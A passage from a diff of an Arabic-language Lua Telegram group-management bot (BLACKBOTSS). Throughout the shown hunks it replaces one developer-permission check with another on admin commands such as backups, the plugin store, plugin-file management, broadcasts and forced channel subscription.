 end
-if text and text:match("^تعين عدد الاعضاء (%d+)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^تعين عدد الاعضاء (%d+)$") and ALLSUDO(msg) then
 local Num = text:match("تعين عدد الاعضاء (%d+)$") 
 database:set(bot_id..'BLACKBOTSS:Num:Add:Bot',Num) 
 send(msg.chat_id_, msg.id_,'⌔︙ تم وضع عدد الاعضاء *~'..Num..'* عضو')
@@ -7560,7 +7632,7 @@ local Groups = database:scard(bot_id..'BLACKBOTSS:Chek:Groups')
 local Users = database:scard(bot_id..'BLACKBOTSS:UsersBot')  
 send(msg.chat_id_, msg.id_,'⌔︙احصائيات البوت \n\n⌔︙عدد المجموعات *~ '..Groups..'\n⌔︙عدد المشتركين ~ '..Users..'*')
 end
-if text == 'جلب نسخه احتياطيه' and DevBLACKBOTSS(msg) then
+if text == 'جلب نسخه احتياطيه' and ALLSUDO(msg) then
 local list = database:smembers(bot_id..'BLACKBOTSS:Chek:Groups')  
 local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
 for k,v in pairs(list) do   
@@ -7700,7 +7772,7 @@ end,nil)
 end
 
 
-if text == 'الملفات' and DevBLACKBOTSS(msg) then
+if text == 'الملفات' and ALLSUDO(msg) then
 t = '⌔︙جميع الملفات : \n — — — — — — — — — \n'
 i = 0
 for v in io.popen('ls BLACKBOTSS_Files'):lines() do
@@ -7712,7 +7784,7 @@ end
 send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
-if DevBLACKBOTSS(msg) then
+if ALLSUDO(msg) then
 local Get_Files, res = https.request("https://raw.githubusercontent.com/BLACKBOTSS/files_BLACKBOTSS/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
@@ -7741,7 +7813,7 @@ return false
 end
 end
 
-if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and ALLSUDO(msg) then
 local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
 local file = name_t[2]..'.lua'
 local file_bot = io.open("BLACKBOTSS_Files/"..file,"r")
@@ -7761,7 +7833,7 @@ send(msg.chat_id_, msg.id_,"*⌔︙ عذرا لا يوجد هاكذا ملف ف�
 end
 return false
 end
-if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and DevBLACKBOTSS(msg) then
+if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and ALLSUDO(msg) then
 local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
 local file = name_t[2]..'.lua'
 local file_bot = io.open("BLACKBOTSS_Files/"..file,"r")
@@ -7783,12 +7855,12 @@ send(msg.chat_id_, msg.id_,"*⌔︙ عذرا لا يوجد هاكذا ملف ف�
 end
 return false
 end
-if text == "مسح جميع الملفات" and DevBLACKBOTSS(msg) then
+if text == "مسح جميع الملفات" and ALLSUDO(msg) then
 os.execute("rm -fr BLACKBOTSS_Files/*")
 send(msg.chat_id_,msg.id_,"⌔︙تم حذف جميع الملفات")
 return false
 end
-if text == 'نقل الاحصائيات' and DevBLACKBOTSS(msg) then
+if text == 'نقل الاحصائيات' and ALLSUDO(msg) then
 local Users = database:smembers('BLACKBOTSS:'..bot_id.."userss")
 local Groups = database:smembers('BLACKBOTSS:'..bot_id..'groups') 
 for i = 1, #Groups do
@@ -7799,11 +7871,11 @@ database:sadd(bot_id..'BLACKBOTSS:UsersBot',Users[i])
 end
 send(msg.chat_id_, msg.id_,'⌔︙تم نقل : '..#Groups..' كروب\n⌔︙تم نقل : '..#Users..' مشترك \n⌔︙من التحديث القديم الى التحديث الجديد')
 end
-if text == 'حذف كليشه المطور' and DevBLACKBOTSS(msg) then
+if text == 'حذف كليشه المطور' and ALLSUDO(msg) then
 database:del(bot_id..'BLACKBOTSS:Text_Dev')
 send(msg.chat_id_, msg.id_,'⌔︙ تم حذف كليشه المطور')
 end
-if text == 'وضع كليشه المطور' and DevBLACKBOTSS(msg) then
+if text == 'وضع كليشه المطور' and ALLSUDO(msg) then
 database:set(bot_id..'BLACKBOTSS:Set:Text_Dev'..msg.chat_id_,true)
 send(msg.chat_id_,msg.id_,'⌔︙ ارسل الكليشه الان')
 return false
@@ -7819,7 +7891,7 @@ database:del(bot_id..'BLACKBOTSS:Set:Text_Dev'..msg.chat_id_)
 send(msg.chat_id_,msg.id_,'⌔︙تم حفظ كليشة المطور')
 return false
 end
-if text == 'رفع النسخه الاحتياطيه' and DevBLACKBOTSS(msg) then   
+if text == 'رفع النسخه الاحتياطيه' and ALLSUDO(msg) then   
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
 if result.content_.document_ then 
@@ -7831,7 +7903,7 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
 end
-if text == "تحديث" and DevBLACKBOTSS(msg) then
+if text == "تحديث" and ALLSUDO(msg) then
 dofile("BLACKBOTSS.lua")  
 send(msg.chat_id_, msg.id_, "⌔︙تم التحديث")
 end
@@ -8156,7 +8228,7 @@ send(msg.chat_id_, msg.id_,'⌔︙البوت ليس ادمن يرجى ترقيت
 return false  
 end
 tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
-if tonumber(data.member_count_) < tonumber(database:get(bot_id..'BLACKBOTSS:Num:Add:Bot') or 0) and not DevBLACKBOTSS(msg) then
+if tonumber(data.member_count_) < tonumber(database:get(bot_id..'BLACKBOTSS:Num:Add:Bot') or 0) and not ALLSUDO(msg) then
 send(msg.chat_id_, msg.id_,'⌔︙عدد اعضاء المجموعه اقل من *~ {'..(database:get(bot_id..'BLACKBOTSS:Num:Add:Bot') or 0)..'* عضو')
 return false
 end
@@ -8189,7 +8261,7 @@ Text = '⌔︙تم تفعيل مجموعه جديده\n'..
 '\n⌔︙عدد اعضاء المجموعه *~ '..NumMember..'*'..
 '\n⌔︙اسم المجموعه ~ ['..NameChat..']'..
 '\n⌔︙الرابط ~ ['..LinkGp..']'
-if not DevBLACKBOTSS(msg) then
+if not ALLSUDO(msg) then
 sendText(Id_Sudo,Text,0,'md')
 end
 end
@@ -8235,7 +8307,7 @@ Text = '⌔︙تم تعطيل مجموعه جديده\n'..
 '\n⌔︙ايدي المجموعه ~ `'..IdChat..'`'..
 '\n⌔︙اسم المجموعه ~ ['..NameChat..']'..
 '\n⌔︙الرابط ~ ['..LinkGp..']'
-if not DevBLACKBOTSS(msg) then
+if not ALLSUDO(msg) then
 sendText(Id_Sudo,Text,0,'md')
 end
 end
@@ -8272,7 +8344,7 @@ end
 if database:sismember(bot_id..'BLACKBOTSS:Chek:Groups',msg.chat_id_) then
 send(msg.chat_id_, msg.id_,'⌔︙المجموعه مفعله سابقا ')
 else
-if tonumber(data.member_count_) < tonumber(database:get(bot_id..'BLACKBOTSS:Num:Add:Bot') or 0) and not DevBLACKBOTSS(msg) then
+if tonumber(data.member_count_) < tonumber(database:get(bot_id..'BLACKBOTSS:Num:Add:Bot') or 0) and not ALLSUDO(msg) then
 send(msg.chat_id_, msg.id_,'⌔︙عدد اعضاء المجموعه اقل من *~ {'..(database:get(bot_id..'BLACKBOTSS:Num:Add:Bot') or 0)..'* عضو')
 return false
 end
@@ -8303,7 +8375,7 @@ Text = '⌔︙تم تفعيل مجموعه جديده\n'..
 '\n⌔︙عدد اعضاء المجموعه *~ '..NumMember..'*'..
 '\n⌔︙اسم المجموعه ~ ['..NameChat..']'..
 '\n⌔︙الرابط ~ ['..LinkGp..']'
-if not DevBLACKBOTSS(msg) then
+if not ALLSUDO(msg) then
 sendText(Id_Sudo,Text,0,'md')
 end
 end
@@ -8326,7 +8398,7 @@ send(msg.chat_id_, msg.id_,'⌔︙عـليك الاشـتࢪاك في قنـاة
 end
 return false
 end  
-if DevBLACKBOTSS(msg) then
+if ALLSUDO(msg) then
 local Text = '⌔︙مرحبا بك في اوامر المطور الجاهزه'
 local keyboard = {
 {'الاحصائيات ⌔'},
@@ -8364,7 +8436,7 @@ end
 database:setex(bot_id..'BLACKBOTSS:Start:Time'..msg.sender_user_id_,60,true)
 return false
 end
-if not DevBLACKBOTSS(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') then
+if not ALLSUDO(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') then
 send(msg.sender_user_id_,msg.id_,'⌔︙تمت ارسال رسالتك الى ~ ['..UserName..']')    
 tdcli_function({ID ="GetChat",chat_id_=Id_Sudo},function(arg,chat)  
 tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
@@ -8375,7 +8447,7 @@ if data and data.messages_ and data.messages_[0].content_.sticker_ then
 sendText(Id_Sudo,'⌔︙تم ارسال الملصق من ~ ['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')',0,'md') 
 return false
 end;end;end,nil);end,nil);end,nil);end,nil);end
-if DevBLACKBOTSS(msg) and msg.reply_to_message_id_ ~= 0  then    
+if ALLSUDO(msg) and msg.reply_to_message_id_ ~= 0  then    
 tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
 if result.forward_info_.sender_user_id_ then     
 id_user = result.forward_info_.sender_user_id_    
@@ -8415,7 +8487,7 @@ Text = '⌔︙تمت ارسال البصمه اليه .. '
 end     
 sendText(Id_Sudo,Text..'\n'..'⌔︙ ~ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
 end,nil);end,nil);end,nil);end,nil);end 
-if DevBLACKBOTSS(msg) then
+if ALLSUDO(msg) then
 if text == 'تفعيل التواصل ⌔' then  
 database:del(bot_id..'Texting:In:Bv') 
 send(msg.chat_id_, msg.id_,'⌔︙ تم تفعيل التواصل ') 
@@ -8513,7 +8585,7 @@ database:set(bot_id..'BLACKBOTSS:Free:Add:Bots',true)
 send(msg.chat_id_, msg.id_,'\n⌔︙تم تعطيل البوت الخدمي') 
 end
 if text=="اذاعه خاص ⌔" and msg.reply_to_message_id_ == 0 then
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -8522,7 +8594,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء ~ { ملصق, متحر�
 return false
 end 
 if text=="اذاعه ⌔" and msg.reply_to_message_id_ == 0 then
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -8531,7 +8603,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء ~ { ملصق, متحر�
 return false
 end  
 if text=="اذاعه بالتوجيه ⌔" and msg.reply_to_message_id_ == 0  then
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -8540,7 +8612,7 @@ send(msg.chat_id_, msg.id_,"⌔︙ارسل لي التوجيه الان")
 return false
 end 
 if text=="اذاعه بالتوجيه خاص ⌔" and msg.reply_to_message_id_ == 0  then
-if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not DevBLACKBOTSS(msg) then 
+if database:get(bot_id.."BLACKBOTSS:Status:Bc") and not ALLSUDO(msg) then 
 send(msg.chat_id_, msg.id_,"⌔︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
@@ -8589,27 +8661,27 @@ if text == 'حذف كليشه ستارت ⌔' then
 database:del(bot_id..'Start:Bot') 
 send(msg.chat_id_, msg.id_,'⌔︙تم حذف كليشه ستارت') 
 end
-if text and text:match("^- تغير الاشتراك ⌔ .$") and DevBLACKBOTSS(msg) then  
+if text and text:match("^- تغير الاشتراك ⌔ .$") and ALLSUDO(msg) then  
 database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, '⌔︙حسنآ ارسل لي معرف القناة')
 return false  
 end
-if text and text:match("^- تغير رساله الاشتراك ⌔ .$") and DevBLACKBOTSS(msg) then  
+if text and text:match("^- تغير رساله الاشتراك ⌔ .$") and ALLSUDO(msg) then  
 database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, '⌔︙حسنآ ارسل لي النص الذي تريده')
 return false  
 end
-if text == "حذف رساله الاشتراك ⌔ ." and DevBLACKBOTSS(msg) then  
+if text == "حذف رساله الاشتراك ⌔ ." and ALLSUDO(msg) then  
 database:del(bot_id..'text:ch:user')
 send(msg.chat_id_, msg.id_, "⌔︙تم مسح رساله الاشتراك ")
 return false  
 end
-if text and text:match("^- تعين قناة الاشتراك ⌔ .$") and DevBLACKBOTSS(msg) then  
+if text and text:match("^- تعين قناة الاشتراك ⌔ .$") and ALLSUDO(msg) then  
 database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, '⌔︙حسنآ ارسل لي معرف القناة')
 return false  
 end
-if text == "- تفعيل الاشتراك الاجباري ⌔ ." and DevBLACKBOTSS(msg) then  
+if text == "- تفعيل الاشتراك الاجباري ⌔ ." and ALLSUDO(msg) then  
 if database:get(bot_id..'add:ch:id') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_,"⌔︙الاشتراك الاجباري مفعل \n⌔︙على القناة » ["..addchusername.."]")
@@ -8619,13 +8691,13 @@ send(msg.chat_id_, msg.id_,"⌔︙اهلا عزيزي المطور \n⌔︙ار�
 end
 return false  
 end
-if text == "- تعطيل الاشتراك الاجباري ⌔ ." and DevBLACKBOTSS(msg) then  
+if text == "- تعطيل الاشتراك الاجباري ⌔ ." and ALLSUDO(msg) then  
 database:del(bot_id..'add:ch:id')
 database:del(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_, "⌔︙تم تعطيل الاشتراك الاجباري ")
 return false  
 end
-if text == "- الاشتراك الاجباري ⌔ ." and DevBLACKBOTSS(msg) then  
+if text == "- الاشتراك الاجباري ⌔ ." and ALLSUDO(msg) then  
 if database:get(bot_id..'add:ch:username') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_, "⌔︙تم تفعيل الاشتراك الاجباري \n⌔︙على القناة » ["..addchusername.."]")
@@ -8676,16 +8748,16 @@ local texxt = string.match(text, "(.*)")
 database:set(bot_id..'text:ch:user',texxt)
 send(msg.chat_id_, msg.id_,'⌔︙تم تغيير رسالة الاشتراك ')
 end
-if text == ("مسح قائمه العام ⌔") and DevBLACKBOTSS(msg) then
+if text == ("مسح قائمه العام ⌔") and ALLSUDO(msg) then
 database:del(bot_id.."BLACKBOTSS:GBan:User")
 send(msg.chat_id_, msg.id_, "\n⌔︙تم مسح قائمه العام")
 return false
 end
-if text == ("مسح المطورين ⌔") and DevBLACKBOTSS(msg) then
+if text == ("مسح المطورين ⌔") and ALLSUDO(msg) then
 database:del(bot_id.."BLACKBOTSS:Sudo:User")
 send(msg.chat_id_, msg.id_, "\n⌔︙ تم مسح قائمة المطورين  ")
 end
-if text == ("قائمه العام ⌔") and DevBLACKBOTSS(msg) then
+if text == ("قائمه العام ⌔") and ALLSUDO(msg) then
 local list = database:smembers(bot_id.."BLACKBOTSS:GBan:User")
 t = "\n⌔︙قائمة المحظورين عام \n — — — — — — — — — \n"
 for k,v in pairs(list) do
@@ -8702,7 +8774,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("المطورين ⌔") and DevBLACKBOTSS(msg) then
+if text == ("المطورين ⌔") and ALLSUDO(msg) then
 local list = database:smembers(bot_id.."BLACKBOTSS:Sudo:User")
 t = "\n⌔︙قائمة مطورين البوت \n — — — — — — — — — \n"
 for k,v in pairs(list) do
